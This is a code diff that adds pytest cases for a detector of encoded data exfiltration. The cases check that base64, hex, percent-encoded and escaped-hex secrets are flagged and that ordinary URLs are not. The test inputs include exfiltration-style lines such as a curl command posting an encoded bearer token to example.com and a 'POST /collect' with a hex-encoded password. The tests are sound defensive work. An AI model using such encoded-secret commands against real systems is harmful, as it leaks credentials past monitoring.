@@ -3,6 +3,7 @@
 
 # Standard
 import base64
+import os
 
 # Third-Party
 import pytest
@@ -18,6 +19,9 @@ try:
     RUST_AVAILABLE = True
 except ImportError:
     RUST_AVAILABLE = False
+    # Fail in CI if Rust plugins are required
+    if os.environ.get("REQUIRE_RUST_PLUGINS") == "1":
+        raise ImportError("Rust plugin 'encoded_exfil_detection' is required in CI but not available")
 
 
 @pytest.mark.parametrize(
@@ -69,6 +73,109 @@ class TestEncodedDetectionScan:
         assert count == 0
         assert findings == []
         assert redacted == payload
+
+    def test_base64_with_word_boundaries(self, use_rust: bool):
+        """Test that base64 patterns correctly match at word boundaries."""
+        cfg = EncodedExfilDetectorConfig()
+
+        # Should detect: base64 with spaces around it
+        encoded = base64.b64encode(b"authorization: bearer secret-token-value").decode()
+        payload1 = {"text": f"data {encoded} end"}
+        count1, _, findings1 = _scan_container(payload1, cfg, use_rust=use_rust)
+        assert count1 >= 1, "Should detect base64 with spaces"
+
+        # Should detect: base64 at start of string
+        payload2 = {"text": f"{encoded} followed by text"}
+        count2, _, findings2 = _scan_container(payload2, cfg, use_rust=use_rust)
+        assert count2 >= 1, "Should detect base64 at start"
+
+        # Should detect: base64 at end of string
+        payload3 = {"text": f"text followed by {encoded}"}
+        count3, _, findings3 = _scan_container(payload3, cfg, use_rust=use_rust)
+        assert count3 >= 1, "Should detect base64 at end"
+
+        # Should detect: base64 with punctuation boundaries
+        payload4 = {"text": f"curl -d '{encoded}' https://example.com"}
+        count4, _, findings4 = _scan_container(payload4, cfg, use_rust=use_rust)
+        assert count4 >= 1, "Should detect base64 with punctuation"
+
+    def test_hex_with_word_boundaries(self, use_rust: bool):
+        """Test that hex patterns correctly match at word boundaries."""
+        cfg = EncodedExfilDetectorConfig()
+
+        # Should detect: hex with spaces
+        hex_data = b"password=secret-value-for-upload".hex()
+        payload1 = {"text": f"data {hex_data} end"}
+        count1, _, findings1 = _scan_container(payload1, cfg, use_rust=use_rust)
+        assert count1 >= 1, "Should detect hex with spaces"
+
+        # Should detect: hex with punctuation
+        payload2 = {"text": f"POST /collect data={hex_data}"}
+        count2, _, findings2 = _scan_container(payload2, cfg, use_rust=use_rust)
+        assert count2 >= 1, "Should detect hex with punctuation"
+
+    def test_no_false_positives_in_urls(self, use_rust: bool):
+        """Test that we don't falsely detect base64-like patterns in URLs."""
+        cfg = EncodedExfilDetectorConfig()
+
+        # URLs with base64-like segments should not trigger if they're part of valid URLs
+        # and don't decode to sensitive content
+        payload = {"url": "https://example.com/path/to/resource", "message": "Visit our website at https://example.com"}
+
+        count, _, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        # Should have 0 findings since these are normal URLs without sensitive encoded data
+        assert count == 0, "Should not detect normal URLs as encoded exfil"
+
+    def test_concatenated_alphanumeric_not_detected(self, use_rust: bool):
+        """Test that long alphanumeric strings that aren't valid encodings don't trigger."""
+        cfg = EncodedExfilDetectorConfig()
+
+        # Long alphanumeric string that's not valid base64/hex
+        payload = {"id": "user123456789abcdefghijklmnopqrstuvwxyz"}
+
+        count, _, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        # Should not detect since it won't decode properly or meet suspicion criteria
+        assert count == 0, "Should not detect random alphanumeric strings"
+
+    def test_base64url_detection(self, use_rust: bool):
+        """Test base64url encoding detection (uses - and _ instead of + and /)."""
+        cfg = EncodedExfilDetectorConfig()
+
+        # Base64url encoding
+        import base64
+
+        encoded = base64.urlsafe_b64encode(b"api_key=secret-token-value-here").decode()
+        payload = {"data": f"token={encoded}"}
+
+        count, _, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        assert count >= 1, "Should detect base64url encoding"
+        assert any(f.get("encoding") in {"base64", "base64url"} for f in findings)
+
+    def test_percent_encoding_detection(self, use_rust: bool):
+        """Test percent-encoded data detection."""
+        cfg = EncodedExfilDetectorConfig()
+
+        # Percent-encode a sensitive string
+        text = "password=secret-value"
+        percent_encoded = "".join(f"%{ord(c):02x}" for c in text)
+        payload = {"data": f"send {percent_encoded} to server"}
+
+        count, _, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        assert count >= 1, "Should detect percent encoding"
+        assert any(f.get("encoding") == "percent_encoding" for f in findings)
+
+    def test_escaped_hex_detection(self, use_rust: bool):
+        """Test escaped hex (\\xNN) detection."""
+        cfg = EncodedExfilDetectorConfig()
+
+        # Escaped hex encoding
+        text = "token=secret"
+        escaped_hex = "".join(f"\\x{ord(c):02x}" for c in text)
+        payload = {"data": f"payload {escaped_hex}"}
+
+        count, _, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        assert count >= 1, "Should detect escaped hex"
+        assert any(f.get("encoding") == "escaped_hex" for f in findings)
 
 
 @pytest.mark.asyncio
